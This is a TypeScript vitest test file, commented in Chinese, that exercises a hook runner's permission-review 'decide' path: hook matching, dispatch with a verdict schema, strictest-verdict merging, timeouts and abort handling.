/**
 * Hook runner 的判定型入口（`decide`）—— 匹配 → 并行派发（带结果契约）→ 读结论 → 按严格程度合并。
 *
 * 契约见 hookRunner.ts 文件头「判定型埋点」一节与 docs/permission-review-design.md §3。分组：
 *   HD-1…9      入口、匹配与派发形状：结论的形状、runTask 入参（多一个 resultContract）、when 读嵌套
 *               字段、注册表现取，以及没有会话上下文 / 非判定型 id / 调用时已中止这几条早退；
 *   HD-10…15    合并：最严者胜、平局按注册表次序、「没有意见」的各种来源、不短路、失败 end 的形状；
 *   HD-16…18    不去重，两类埋点互不干扰；
 *   HD-19…22    超时：缺省 60 秒、与观察型的上限互不影响、计时起点、不配合中止的派发拖不住 decide；
 *   HD-23…30    中止：外部 signal（派发中 / 模型解析中 / 结束之后）、监听器不泄漏、abortSession；
 *   HD-31       监控面；
 *   HD-32…35    兜底与类型：绝不 reject、观测回调抛错、编译期收窄、payload 在入口快照。
 *
 * 夹具见 ./harness.ts（permissionPayload / verdict / scriptedRunTask；观测面 = onRun 事件 + logger 行）。
 */
import { afterEach, describe, expect, expectTypeOf, it, vi } from 'vitest'
import {
  PERMISSION_VERDICT_SCHEMA,
  type PermissionDecision,
  type PermissionRisk,
  type PermissionVerdict
} from '@shuvix/chat-protocol/types/permissionReview'
import {
  DEFAULT_DECIDE_TIMEOUT_MS,
  DEFAULT_HOOK_TIMEOUT_MS,
  type HookDecision,
  type HookRegistryEntry
} from '../hookRunner'
import type { ParsedHookFile } from '../hookFile'
import { renderHookPrompt } from '../hookPrompt'
import type { SubAgentModelConfig } from '../../subagent/types'
import {
  MODEL,
  PROFILE,
  deferred,
  entryOf,
  fileOf,
  gatedRunTask,
  makeRunner,
  observeKey,
  permissionPayload,
  promptPayload,
  scriptedRunTask,
  settle,
  verdict,
  verdictResult,
  type DecideBehavior,
  type RunTaskResult
} from './harness'

const TRIGGER = 'permission.request'

afterEach(() => {
  vi.useRealTimers()
})

/** 绑在 permission.request 上的 hook 文件（缺省名 hk / 显示名 Hook K / 派 worker） */
const reviewFile = (over: Partial<ParsedHookFile> = {}): ParsedHookFile =>
  fileOf({ bindings: [{ trigger: TRIGGER }], ...over })

/** 按名造一个绑 permission.request 的条目，显示名 `Hook <name>` */
const hookNamed = (name: string, over: Partial<ParsedHookFile> = {}): HookRegistryEntry =>
  entryOf(reviewFile({ name, displayName: `Hook ${name}`, ...over }))

/** 盯住一个 promise 落没落定，而不 await 它 */
function track<T>(promise: Promise<T>): { promise: Promise<T>; done: () => boolean } {
  let done = false
  void promise.then(
    () => (done = true),
    () => (done = true)
  )
  return { promise, done: () => done }
}

/** promise 在 ms 内落定，否则以明确的消息失败（「拖住 decide」不该只表现为一次测试超时） */
async function within<T>(ms: number, promise: Promise<T>): Promise<T> {
  let timer: ReturnType<typeof setTimeout> | undefined
  const timeout = new Promise<never>((_resolve, reject) => {
    timer = setTimeout(() => reject(new Error(`decide did not settle within ${ms}ms`)), ms)
  })
  try {
    return await Promise.race([promise, timeout])
  } finally {
    clearTimeout(timer)
  }
}

describe('入口、匹配与派发形状', () => {
  it('HD-1 单个 hook 交回合格判决 → {result, hook}（hook 取 name 不取 displayName）；start → end，end 带上结论', async () => {
    const V = verdict('deny', { risk: 'high' })
    const h = makeRunner({
      entries: [entryOf(reviewFile())],
      runTask: async () => verdictResult(V)
    })

    const decision = await h.runner.decide(TRIGGER, permissionPayload())

    expect(decision).toEqual({ result: V, hook: 'hk' })
    expect(h.events.map((e) => e.type)).toEqual(['start', 'end'])
    const [start] = h.starts()
    expect(start.run).toEqual({
      runId: expect.stringMatching(/^hkr-/),
      hook: 'hk',
      source: 'builtin',
      trigger: TRIGGER,
      sessionId: 's1',
      agent: 'worker',
      startedAt: expect.any(Number)
    })
    const [end] = h.ends()
    expect(end.run).toEqual(start.run)
    expect(end.ok).toBe(true)
    expect(end.result).toEqual(V)
    expect(Object.keys(end).sort()).toEqual(['ms', 'ok', 'result', 'run', 'type'])
    expect(h.infos()).toContainEqual(expect.stringMatching(/^hook "hk" run=hkr-\S+ ok \(\d+ms\)$/))
    expect(h.warns()).toEqual([])
    expect(h.runner.runningCount()).toBe(0)
  })

  it('HD-2 runTask 入参 = 观察型那六个键 + resultContract（恰 schema 与 sourceLabel，无 nudges）；prompt 带嵌套 YAML；模型每个命中 hook 各解析一次', async () => {
    const model: SubAgentModelConfig = {
      provider: 'anthropic',
      model: 'm-2',
      capabilities: {},
      thinkingLevel: 'high'
    }
    const h = makeRunner({
      entries: [
        entryOf(reviewFile({ displayName: 'Shown To Users', prompt: 'Judge it.' })),
        hookNamed('second')
      ],
      resolveRunModel: async () => model,
      runTask: async () => verdictResult(verdict('allow'))
    })
    const payload = permissionPayload({ sessionId: 's-root' })

    await h.runner.decide(TRIGGER, payload)

    expect(h.runTask).toHaveBeenCalledTimes(2)
    const params = h.runTask.mock.calls
      .map(([p]) => p)
      .find((p) => p.resultContract?.sourceLabel === 'hk')!
    expect(Object.keys(params).sort()).toEqual([
      'agentType',
      'description',
      'modelConfig',
      'parentAbortSignal',
      'parentSessionId',
      'prompt',
      'resultContract'
    ])
    expect(params.resultContract).toStrictEqual({
      schema: PERMISSION_VERDICT_SCHEMA,
      sourceLabel: 'hk'
    })
    expect(params.resultContract?.schema).toBe(PERMISSION_VERDICT_SCHEMA)
    expect(params.parentSessionId).toBe('s-root')
    expect(params.agentType).toBe(PROFILE)
    expect(params.description).toBe('Shown To Users')
    expect(params.parentAbortSignal).toBeInstanceOf(AbortSignal)
    expect(params.parentAbortSignal?.aborted).toBe(false)
    expect(params.prompt).toBe(renderHookPrompt('Judge it.', TRIGGER, { ...payload }))
    expect(
      params.prompt.startsWith('Judge it.\n\n<hook_event trigger="permission.request">\n')
    ).toBe(true)
    // 嵌套字段以 YAML 缩进呈现；trigger 只在围栏属性上，YAML 顶层没有这一行
    expect(params.prompt).toContain('operation:\n  tool: bash\n')
    expect(params.prompt).toContain('  facts:\n    channel: bash\n')
    expect(params.prompt).toContain('policy:\n  names:\n    - ask-on-command\n')
    expect(params.prompt).not.toMatch(/^trigger:/m)
    expect(params.modelConfig).toEqual({
      provider: 'anthropic',
      model: 'm-2',
      capabilities: {},
      thinkingLevel: 'high'
    })

    expect(h.resolveRunModel).toHaveBeenCalledTimes(2)
    for (const [ctx] of h.resolveRunModel.mock.calls) expect(ctx).toEqual({ sessionId: 's-root' })
    expect(h.resolveAgentProfile).toHaveBeenCalledTimes(2)
  })

  it('HD-3 只有观察型绑定 → null：不解析 agent / 模型、不派发、没有事件也没有日志', async () => {
    const h = makeRunner({
      entries: [
        entryOf(fileOf()),
        entryOf(fileOf({ name: 'turn', bindings: [{ trigger: 'session.turn-completed' }] }))
      ]
    })
    expect(await h.runner.decide(TRIGGER, permissionPayload())).toBeNull()
    await settle()
    expect(h.listHooks).toHaveBeenCalledTimes(1)
    expect(h.resolveAgentProfile).not.toHaveBeenCalled()
    expect(h.resolveRunModel).not.toHaveBeenCalled()
    expect(h.runTask).not.toHaveBeenCalled()
    expect(h.events).toEqual([])
    expect(h.logs).toEqual([])
  })

  it('HD-4 when 读得到嵌套字段、列表 / 映射成员、event.trigger 与 env —— 各自命中或不命中', async () => {
    const gated = (name: string, when: string): HookRegistryEntry =>
      hookNamed(name, { bindings: [{ trigger: TRIGGER, when }] })
    const h = makeRunner({
      entries: [
        gated('nested-hit', "event.operation.objectType == 'command'"),
        gated('nested-miss', "event.agent.kind == 'spawned'"),
        gated('list-hit', "'ask-on-command' in event.policy.names"),
        gated('list-miss', "'ask-on-write' in event.policy.names"),
        gated('map-hit', "'channel' in event.operation.facts"),
        gated('map-miss', "'host' in event.operation.facts"),
        gated('trigger-env', "event.trigger == 'permission.request' && env.host == 'desktop'"),
        gated('other-host', "env.host == 'extension'")
      ],
      runTask: async () => verdictResult(verdict('allow'))
    })

    await h.runner.decide(TRIGGER, permissionPayload())

    expect(
      h
        .starts()
        .map((e) => e.run.hook)
        .sort()
    ).toEqual(['list-hit', 'map-hit', 'nested-hit', 'trigger-env'])
    expect(h.runTask).toHaveBeenCalledTimes(4)
    expect(h.warns()).toEqual([])
  })

  it('HD-4 when 引用不存在的嵌套键（facts.host）→ 该 hook 不命中 + 一条 when evaluation failed；别的 hook 照跑', async () => {
    const h = makeRunner({
      entries: [
        hookNamed('bad', {
          bindings: [{ trigger: TRIGGER, when: "event.operation.facts.host == 'prod'" }]
        }),
        hookNamed('ok')
      ],
      runTask: async () => verdictResult(verdict('ask'))
    })

    expect(await h.runner.decide(TRIGGER, permissionPayload())).toEqual({
      result: verdict('ask'),
      hook: 'ok'
    })
    expect(h.starts().map((e) => e.run.hook)).toEqual(['ok'])
    expect(h.warns()).toHaveLength(1)
    expect(h.warns()[0]).toContain('hook "bad": when evaluation failed')
    expect(h.warns()[0]).toContain('No such key: host')
  })

  it('HD-4 求值出错的是唯一的 hook → null：不派发', async () => {
    const h = makeRunner({
      entries: [
        entryOf(
          reviewFile({
            bindings: [{ trigger: TRIGGER, when: "event.operation.facts.host == 'x'" }]
          })
        )
      ]
    })
    expect(await h.runner.decide(TRIGGER, permissionPayload())).toBeNull()
    expect(h.runTask).not.toHaveBeenCalled()
    expect(h.events).toEqual([])
    expect(h.warns()).toEqual([expect.stringContaining('when evaluation failed')])
  })

  it('HD-5 同一 hook 两条 permission.request 绑定都为真 → 只起一个 run', async () => {
    const h = makeRunner({
      entries: [entryOf(reviewFile({ bindings: [{ trigger: TRIGGER }, { trigger: TRIGGER }] }))],
      runTask: async () => verdictResult(verdict('allow'))
    })
    expect(await h.runner.decide(TRIGGER, permissionPayload())).toEqual({
      result: verdict('allow'),
      hook: 'hk'
    })
    expect(h.runTask).toHaveBeenCalledTimes(1)
    expect(h.warns()).toEqual([])
  })

  it('HD-5 第一条求值出错、第二条为真 → 一个 run + 一条 warn', async () => {
    const h = makeRunner({
      entries: [
        entryOf(
          reviewFile({
            bindings: [
              { trigger: TRIGGER, when: 'event.nope' },
              { trigger: TRIGGER, when: "event.agent.kind == 'root'" }
            ]
          })
        )
      ],
      runTask: async () => verdictResult(verdict('allow'))
    })
    expect(await h.runner.decide(TRIGGER, permissionPayload())).not.toBeNull()
    expect(h.runTask).toHaveBeenCalledTimes(1)
    expect(h.warns()).toEqual([expect.stringContaining('when evaluation failed')])
  })

  it('HD-6 注册表每次 decide 现取：两次之间加一份即生效', async () => {
    const entries: HookRegistryEntry[] = []
    const h = makeRunner({
      listHooks: () => entries,
      runTask: async () => verdictResult(verdict('ask'))
    })
    expect(await h.runner.decide(TRIGGER, permissionPayload())).toBeNull()
    expect(h.runTask).not.toHaveBeenCalled()

    entries.push(entryOf(reviewFile()))
    expect(await h.runner.decide(TRIGGER, permissionPayload())).toEqual({
      result: verdict('ask'),
      hook: 'hk'
    })
    expect(h.listHooks).toHaveBeenCalledTimes(2)
  })

  it('HD-6 listHooks 抛错 → null、一条 hook registry listing failed、不派发', async () => {
    const h = makeRunner({
      listHooks: () => {
        throw new Error('disk gone')
      }
    })
    await expect(h.runner.decide(TRIGGER, permissionPayload())).resolves.toBeNull()
    expect(h.warns()).toEqual(['hook registry listing failed: disk gone'])
    expect(h.events).toEqual([])
    expect(h.runTask).not.toHaveBeenCalled()
  })

  const { sessionId: _dropped, ...withoutSession } = permissionPayload()
  it.each([
    { label: "''", payload: { ...permissionPayload(), sessionId: '' } },
    { label: 'missing', payload: withoutSession },
    { label: '42', payload: { ...permissionPayload(), sessionId: 42 } }
  ])(
    'HD-7 没有会话上下文（sessionId: $label）→ null、warn、不取注册表、不派发',
    async ({ payload }) => {
      const h = makeRunner({ entries: [entryOf(reviewFile())] })
      expect(await h.runner.decide(TRIGGER, payload as never)).toBeNull()
      expect(h.warns()).toHaveLength(1)
      expect(h.warns()[0]).toContain(`hook decide(${TRIGGER}): no session context`)
      expect(h.listHooks).not.toHaveBeenCalled()
      expect(h.events).toEqual([])
      expect(h.runTask).not.toHaveBeenCalled()
    }
  )

  it.each(['session.prompt-accepted', 'session.turn-completed', 'file.changed'])(
    'HD-8 非判定型 id %s（绕过类型）→ null、一条 not a decide trigger、不取注册表、不派发',
    async (id) => {
      const h = makeRunner({
        entries: [entryOf(fileOf({ bindings: [{ trigger: id }] })), hookNamed('review')]
      })
      expect(await h.runner.decide(id as never, permissionPayload() as never)).toBeNull()
      await settle()
      expect(h.warns()).toEqual([`hook decide(${id}): not a decide trigger`])
      expect(h.listHooks).not.toHaveBeenCalled()
      expect(h.events).toEqual([])
      expect(h.runTask).not.toHaveBeenCalled()
    }
  )

  it('HD-9 调用时 signal 已落下 → null：不取注册表、不派发、没有事件', async () => {
    const controller = new AbortController()
    controller.abort()
    const h = makeRunner({ entries: [entryOf(reviewFile())] })
    expect(
      await h.runner.decide(TRIGGER, permissionPayload(), { signal: controller.signal })
    ).toBeNull()
    await settle()
    expect(h.listHooks).not.toHaveBeenCalled()
    expect(h.resolveAgentProfile).not.toHaveBeenCalled()
    expect(h.runTask).not.toHaveBeenCalled()
    expect(h.events).toEqual([])
  })
})

describe('合并：最严者胜', () => {
  type Pick = [PermissionDecision, PermissionRisk]
  it.each<[string, Pick, Pick, 'A' | 'B']>([
    ['allow / deny', ['allow', 'low'], ['deny', 'low'], 'B'],
    ['deny / allow', ['deny', 'low'], ['allow', 'low'], 'A'],
    ['ask / allow', ['ask', 'low'], ['allow', 'low'], 'A'],
    ['allow / ask', ['allow', 'low'], ['ask', 'low'], 'B'],
    ['ask / deny', ['ask', 'low'], ['deny', 'low'], 'B'],
    ['allow / allow', ['allow', 'low'], ['allow', 'low'], 'A'],
    ['{allow, critical} / {ask, low}', ['allow', 'critical'], ['ask', 'low'], 'B']
  ])(
    'HD-10 A、B 依次（%s）→ %j 与 %j 里 %s 胜出，结论是它的整份判决',
    async (_label, a, b, winner) => {
      const va = verdict(a[0], { risk: a[1], summary: 'from A' })
      const vb = verdict(b[0], { risk: b[1], summary: 'from B' })
      const script = scriptedRunTask({ decide: { A: verdictResult(va), B: verdictResult(vb) } })
      const h = makeRunner({ entries: [hookNamed('A'), hookNamed('B')], runTask: script.runTask })

      const decision = await h.runner.decide(TRIGGER, permissionPayload())

      expect(decision).toEqual(
        winner === 'A' ? { result: va, hook: 'A' } : { result: vb, hook: 'B' }
      )
      expect(h.ends().every((e) => e.ok)).toBe(true)
    }
  )

  it('HD-11 一样严时按注册表次序：A、B 都 deny，B 先交卷，胜出的仍是 A', async () => {
    const fromA = verdict('deny', { summary: 'from A' })
    const fromB = verdict('deny', { summary: 'from B' })
    const script = scriptedRunTask({ decide: { A: 'gate', B: verdictResult(fromB) } })
    const h = makeRunner({ entries: [hookNamed('A'), hookNamed('B')], runTask: script.runTask })

    const pending = h.runner.decide(TRIGGER, permissionPayload())
    await vi.waitFor(() => {
      expect(h.ends().map((e) => e.run.hook)).toEqual(['B'])
    })
    script.release('A', verdictResult(fromA))

    expect(await pending).toEqual({ result: fromA, hook: 'A' })
  })

  it.each<[string, { a?: Partial<ParsedHookFile>; behavior?: DecideBehavior; timeout?: number }]>([
    ['超时', { behavior: 'gate', timeout: 20 }],
    ['runTask reject', { behavior: { reject: 'boom' } }],
    ['outcome.error', { behavior: { result: 'half', error: '500 Internal Server Error' } }],
    ['structured 不合格', { behavior: verdictResult({ ...verdict('deny'), decision: 'maybe' }) }],
    ['structured 缺失', { behavior: { result: JSON.stringify(verdict('deny')) } }],
    ['未知 agent', { a: { agent: 'ghost' } }],
    ['resolveAgentProfile 抛错', { a: { agent: 'explodes' } }]
  ])('HD-12 A 没有意见（%s）、B allow → 结论是 B 的 allow', async (_label, setup) => {
    const allowB = verdict('allow', { summary: 'from B' })
    const script = scriptedRunTask({
      // A 没写脚本时给一份 deny：它若被错误地派发并读取，结论就会变成 deny
      decide: { A: setup.behavior ?? verdictResult(verdict('deny')), B: verdictResult(allowB) }
    })
    const h = makeRunner({
      entries: [hookNamed('A', setup.a), hookNamed('B')],
      runTask: script.runTask,
      decideTimeoutMs: setup.timeout,
      resolveAgentProfile: (name) => {
        if (name === 'explodes') throw new Error('registry exploded')
        return name === 'worker' ? PROFILE : null
      }
    })

    expect(await h.runner.decide(TRIGGER, permissionPayload())).toEqual({
      result: allowB,
      hook: 'B'
    })
  })

  it('HD-13 不短路：A 立刻 deny，decide 仍等着 B；B 交回 allow 之后才得 deny / A', async () => {
    const denyA = verdict('deny', { summary: 'from A' })
    const script = scriptedRunTask({ decide: { A: verdictResult(denyA), B: 'gate' } })
    const h = makeRunner({ entries: [hookNamed('A'), hookNamed('B')], runTask: script.runTask })

    const pending = track(h.runner.decide(TRIGGER, permissionPayload()))
    await vi.waitFor(() => {
      expect(h.ends().map((e) => e.run.hook)).toEqual(['A'])
    })
    await settle()
    expect(pending.done()).toBe(false)
    expect(script.pending('B')).toBe(1)
    expect(script.paramsOf('B').parentAbortSignal?.aborted).toBe(false)

    script.release('B', verdictResult(verdict('allow')))
    expect(await pending.promise).toEqual({ result: denyA, hook: 'A' })
  })

  describe('HD-14 唯一的 hook 没有意见 → null', () => {
    it.each<[string, RunTaskResult]>([
      [
        '只有散文、没有 structured（result 文本即使是合格 JSON 也不读）',
        { result: JSON.stringify(verdict('allow')) }
      ],
      [
        "structured 不合格：decision 'maybe'",
        verdictResult({ ...verdict('allow'), decision: 'maybe' })
      ],
      [
        'structured 不合格：缺 reason',
        verdictResult((({ reason: _reason, ...rest }) => rest)(verdict('allow')))
      ],
      ['structured 为 null', verdictResult(null)],
      ['structured 是字符串', verdictResult('allow')]
    ])('HD-14 %s → null；end ok:false「no valid result」', async (_label, outcome) => {
      const h = makeRunner({ entries: [entryOf(reviewFile())], runTask: async () => outcome })
      expect(await h.runner.decide(TRIGGER, permissionPayload())).toBeNull()
      expect(h.ends()).toEqual([expect.objectContaining({ ok: false, error: 'no valid result' })])
      expect(h.warns()).toEqual([
        expect.stringMatching(/^hook "hk" run=hkr-\S+ failed: no valid result$/)
      ])
    })

    it('HD-14 outcome.error 与合格 structured 同在 → null（失败说了算）；end.error 为原话', async () => {
      const h = makeRunner({
        entries: [entryOf(reviewFile())],
        runTask: async () => ({
          ...verdictResult(verdict('allow')),
          error: '500 Internal Server Error'
        })
      })
      expect(await h.runner.decide(TRIGGER, permissionPayload())).toBeNull()
      expect(h.ends()).toEqual([
        expect.objectContaining({ ok: false, error: '500 Internal Server Error' })
      ])
      expect('result' in h.ends()[0]).toBe(false)
    })

    it('HD-14 runTask reject → null；end.error 为 reject 的原话', async () => {
      const h = makeRunner({
        entries: [entryOf(reviewFile())],
        runTask: async () => {
          throw new Error('invalid result contract: boom')
        }
      })
      expect(await h.runner.decide(TRIGGER, permissionPayload())).toBeNull()
      expect(h.ends()).toEqual([
        expect.objectContaining({ ok: false, error: 'invalid result contract: boom' })
      ])
      expect(h.runner.runningCount()).toBe(0)
    })

    it('HD-14 未知 agent → null：skip unknown-agent，没有 start、不解析模型、不派发、不占坑', async () => {
      const h = makeRunner({ entries: [entryOf(reviewFile({ agent: 'ghost' }))] })
      const pending = h.runner.decide(TRIGGER, permissionPayload())
      expect(h.runner.runningCount()).toBe(0)
      expect(await pending).toBeNull()
      expect(h.events).toEqual([
        {
          type: 'skip',
          hook: 'hk',
          trigger: TRIGGER,
          sessionId: 's1',
          reason: 'unknown-agent',
          detail: 'no agent definition named "ghost"'
        }
      ])
      expect(h.resolveRunModel).not.toHaveBeenCalled()
      expect(h.runTask).not.toHaveBeenCalled()
      expect(h.infos()).toEqual([
        'hook "hk" skipped for session s1: unknown-agent (no agent definition named "ghost")'
      ])
    })

    it.each<[string, () => Promise<SubAgentModelConfig | null>, string]>([
      ['没有可用模型', async () => null, 'no model available for this session'],
      [
        '模型解析抛错',
        async () => {
          throw new Error('nope')
        },
        'model resolution failed: nope'
      ]
    ])(
      'HD-14 %s → null：skip no-model，没有 start、不派发、坑位释放',
      async (_label, resolveRunModel, detail) => {
        const h = makeRunner({ entries: [entryOf(reviewFile())], resolveRunModel })
        expect(await h.runner.decide(TRIGGER, permissionPayload())).toBeNull()
        expect(h.events).toEqual([
          {
            type: 'skip',
            hook: 'hk',
            trigger: TRIGGER,
            sessionId: 's1',
            reason: 'no-model',
            detail
          }
        ])
        expect(h.runTask).not.toHaveBeenCalled()
        expect(h.runner.runningCount()).toBe(0)
      }
    )

    it('HD-14 resolveAgentProfile 抛错 → null：warn decide run failed to start，没有事件、不派发、不占坑', async () => {
      const h = makeRunner({
        entries: [entryOf(reviewFile())],
        resolveAgentProfile: () => {
          throw new Error('registry exploded')
        }
      })
      const pending = h.runner.decide(TRIGGER, permissionPayload())
      expect(h.runner.runningCount()).toBe(0)
      expect(await pending).toBeNull()
      expect(h.warns()).toEqual(['hook "hk": decide run failed to start — registry exploded'])
      expect(h.events).toEqual([])
      expect(h.runTask).not.toHaveBeenCalled()
    })

    it('HD-14 超时 → null：parentAbortSignal 落下，end「timed out after 20ms」', async () => {
      const script = scriptedRunTask({ decide: { hk: 'gate' } })
      const h = makeRunner({
        entries: [entryOf(reviewFile())],
        decideTimeoutMs: 20,
        runTask: script.runTask
      })
      expect(await h.runner.decide(TRIGGER, permissionPayload())).toBeNull()
      expect(script.paramsOf('hk').parentAbortSignal?.aborted).toBe(true)
      expect(h.ends()).toEqual([
        expect.objectContaining({ ok: false, error: 'timed out after 20ms' })
      ])
    })
  })

  it.each<[string, DecideBehavior, number | undefined, string, RegExp]>([
    ['超时', 'gate', 20, 'timed out after 20ms', /^hook "hk" run=hkr-\S+ timed out after 20ms$/],
    ['派发失败', { reject: 'boom' }, undefined, 'boom', /^hook "hk" run=hkr-\S+ failed: boom$/],
    [
      '模型报错（outcome.error）',
      { result: '', error: '500 Internal Server Error' },
      undefined,
      '500 Internal Server Error',
      /^hook "hk" run=hkr-\S+ failed: 500 Internal Server Error$/
    ],
    [
      '结论不合格',
      verdictResult({ decision: 'allow' }),
      undefined,
      'no valid result',
      /^hook "hk" run=hkr-\S+ failed: no valid result$/
    ]
  ])(
    'HD-15 失败 end（%s）：键恰 error / ms / ok / run / type、没有 result；记 warn',
    async (_label, behavior, timeout, error, line) => {
      const script = scriptedRunTask({ decide: { hk: behavior } })
      const h = makeRunner({
        entries: [entryOf(reviewFile())],
        decideTimeoutMs: timeout,
        runTask: script.runTask
      })
      expect(await h.runner.decide(TRIGGER, permissionPayload())).toBeNull()
      const [end] = h.ends()
      expect(Object.keys(end).sort()).toEqual(['error', 'ms', 'ok', 'run', 'type'])
      expect(end).toMatchObject({ ok: false, error })
      expect(h.warns()).toEqual([expect.stringMatching(line)])
      expect(h.infos().some((l) => l.includes(' ok ('))).toBe(false)
    }
  )

  it('HD-15 中止 → end 同形（error: aborted），记 info 不记 warn', async () => {
    const script = scriptedRunTask({ decide: { hk: 'gate' } })
    const h = makeRunner({ entries: [entryOf(reviewFile())], runTask: script.runTask })
    const controller = new AbortController()
    const pending = h.runner.decide(TRIGGER, permissionPayload(), { signal: controller.signal })
    await vi.waitFor(() => {
      expect(h.runTask).toHaveBeenCalledTimes(1)
    })
    controller.abort()
    expect(await pending).toBeNull()
    const [end] = h.ends()
    expect(Object.keys(end).sort()).toEqual(['error', 'ms', 'ok', 'run', 'type'])
    expect(end).toMatchObject({ ok: false, error: 'aborted' })
    expect(h.warns()).toEqual([])
    expect(h.infos()).toContainEqual(expect.stringMatching(/^hook "hk" run=hkr-\S+ aborted$/))
  })
})

describe('不去重，两类埋点互不干扰', () => {
  it('HD-16 同一 hook × 同一会话并发两次 decide → 两次派发、没有 busy、runId 各异；反序放行各拿各的结论', async () => {
    const gate = gatedRunTask()
    const h = makeRunner({ entries: [entryOf(reviewFile())], runTask: gate.runTask })
    const operation = (target: string): ReturnType<typeof permissionPayload>['operation'] => ({
      ...permissionPayload().operation,
      target
    })

    const first = h.runner.decide(TRIGGER, permissionPayload({ operation: operation('first') }))
    const second = h.runner.decide(TRIGGER, permissionPayload({ operation: operation('second') }))
    await vi.waitFor(() => {
      expect(gate.gates).toHaveLength(2)
    })
    expect(h.skips()).toEqual([])
    expect(h.runner.runningCount()).toBe(2)
    const [a, b] = h.starts()
    expect(a.run.runId).not.toBe(b.run.runId)
    expect(gate.gates[0].params.prompt).toContain('target: first')
    expect(gate.gates[1].params.prompt).toContain('target: second')

    gate.gates[1].release(verdictResult(verdict('allow')))
    gate.gates[0].release(verdictResult(verdict('deny')))
    expect(await first).toEqual({ result: verdict('deny'), hook: 'hk' })
    expect(await second).toEqual({ result: verdict('allow'), hook: 'hk' })
    expect(h.runner.runningCount()).toBe(0)
  })

  it('HD-17 同时绑两类埋点的 hook：decide 在跑时 fire 照派；fire 在跑时 decide 照派；fire 在跑时再 fire 仍 busy', async () => {
    const both = reviewFile({
      bindings: [{ trigger: 'session.prompt-accepted' }, { trigger: TRIGGER }]
    })
    const script = scriptedRunTask({ decide: { hk: 'gate' }, observe: 'gate' })
    const h = makeRunner({ entries: [entryOf(both)], runTask: script.runTask })
    const observed = observeKey('Hook K')

    // decide 在跑 → fire 不算 busy
    const first = h.runner.decide(TRIGGER, permissionPayload())
    await vi.waitFor(() => {
      expect(script.pending('hk')).toBe(1)
    })
    h.runner.fire('session.prompt-accepted', promptPayload())
    await vi.waitFor(() => {
      expect(script.pending(observed)).toBe(1)
    })
    expect(h.skips()).toEqual([])

    // fire 在跑 → decide 照派
    const second = h.runner.decide(TRIGGER, permissionPayload())
    await vi.waitFor(() => {
      expect(script.pending('hk')).toBe(2)
    })
    expect(h.skips()).toEqual([])

    // fire 在跑时再 fire：观察型的去重照旧
    h.runner.fire('session.prompt-accepted', promptPayload())
    expect(h.skips().map((s) => [s.hook, s.reason, s.trigger])).toEqual([
      ['hk', 'busy', 'session.prompt-accepted']
    ])
    expect(h.runner.runningCount()).toBe(3)

    script.release('hk', verdictResult(verdict('ask')))
    script.release('hk', verdictResult(verdict('allow')))
    script.release(observed)
    expect(await first).toEqual({ result: verdict('ask'), hook: 'hk' })
    expect(await second).toEqual({ result: verdict('allow'), hook: 'hk' })
    await h.waitEnd(3)
    expect(h.runner.runningCount()).toBe(0)
  })

  it('HD-18 同一份文件的执行方式由埋点决定：fire 派发不带契约、end 没有 result；decide 派发带契约、end 带结论', async () => {
    const both = reviewFile({
      bindings: [{ trigger: 'session.prompt-accepted' }, { trigger: TRIGGER }]
    })
    const V = verdict('ask')
    const h = makeRunner({ entries: [entryOf(both)], runTask: async () => verdictResult(V) })

    h.runner.fire('session.prompt-accepted', promptPayload())
    await h.waitEnd(1)
    expect('resultContract' in h.call(0)).toBe(false)
    expect(h.ends()[0].ok).toBe(true)
    expect('result' in h.ends()[0]).toBe(false)

    expect(await h.runner.decide(TRIGGER, permissionPayload())).toEqual({ result: V, hook: 'hk' })
    expect(h.call(1).resultContract).toStrictEqual({
      schema: PERMISSION_VERDICT_SCHEMA,
      sourceLabel: 'hk'
    })
    expect(h.ends()[1].result).toEqual(V)
    expect(h.ends().map((e) => e.run.trigger)).toEqual(['session.prompt-accepted', TRIGGER])
  })
})

describe('超时', () => {
  it('HD-19 缺省 60 秒（观察型仍是 5 分钟）：差 1ms 不中止、到点中止 → end「timed out after 60s」、warn、返回 null', async () => {
    expect(DEFAULT_DECIDE_TIMEOUT_MS).toBe(60_000)
    expect(DEFAULT_HOOK_TIMEOUT_MS).toBe(300_000)
    vi.useFakeTimers()
    const script = scriptedRunTask({ decide: { hk: 'gate' } })
    const h = makeRunner({ entries: [entryOf(reviewFile())], runTask: script.runTask })

    const pending = track(h.runner.decide(TRIGGER, permissionPayload()))
    // 让模型解析落定 → start → 计时器挂上 → runTask 被调
    await vi.advanceTimersByTimeAsync(0)
    expect(h.runTask).toHaveBeenCalledTimes(1)
    const signal = h.call().parentAbortSignal!

    await vi.advanceTimersByTimeAsync(DEFAULT_DECIDE_TIMEOUT_MS - 1)
    expect(signal.aborted).toBe(false)
    expect(pending.done()).toBe(false)
    expect(h.ends()).toEqual([])

    await vi.advanceTimersByTimeAsync(1)
    expect(signal.aborted).toBe(true)
    expect(await pending.promise).toBeNull()
    expect(h.ends()).toEqual([expect.objectContaining({ ok: false, error: 'timed out after 60s' })])
    expect(h.warns()).toEqual([
      expect.stringMatching(/^hook "hk" run=hkr-\S+ timed out after 60s$/)
    ])
  })

  it('HD-20 timeoutMs（观察型的上限）不缩短判定：timeoutMs 20、派发 60ms 后交卷 → 照样拿到结论', async () => {
    const h = makeRunner({
      entries: [entryOf(reviewFile())],
      timeoutMs: 20,
      runTask: () =>
        new Promise((resolve) => setTimeout(() => resolve(verdictResult(verdict('deny'))), 60))
    })
    expect(await h.runner.decide(TRIGGER, permissionPayload())).toEqual({
      result: verdict('deny'),
      hook: 'hk'
    })
    expect(h.call().parentAbortSignal?.aborted).toBe(false)
  })

  it('HD-20 decideTimeoutMs 不缩短观察型：decideTimeoutMs 20、fire 的派发 60ms 后收尾 → ok', async () => {
    const h = makeRunner({
      entries: [entryOf(fileOf())],
      decideTimeoutMs: 20,
      runTask: () => new Promise((resolve) => setTimeout(() => resolve({ result: 'ok' }), 60))
    })
    h.runner.fire('session.prompt-accepted', promptPayload())
    await h.waitEnd()
    expect(h.ends()).toEqual([expect.objectContaining({ ok: true })])
    expect(h.call().parentAbortSignal?.aborted).toBe(false)
  })

  it('HD-20 decideTimeoutMs 20 → 文案「timed out after 20ms」（不足一秒给毫秒）', async () => {
    const script = scriptedRunTask({ decide: { hk: 'gate' } })
    const h = makeRunner({
      entries: [entryOf(reviewFile())],
      decideTimeoutMs: 20,
      runTask: script.runTask
    })
    expect(await h.runner.decide(TRIGGER, permissionPayload())).toBeNull()
    expect(h.ends()[0].error).toBe('timed out after 20ms')
  })

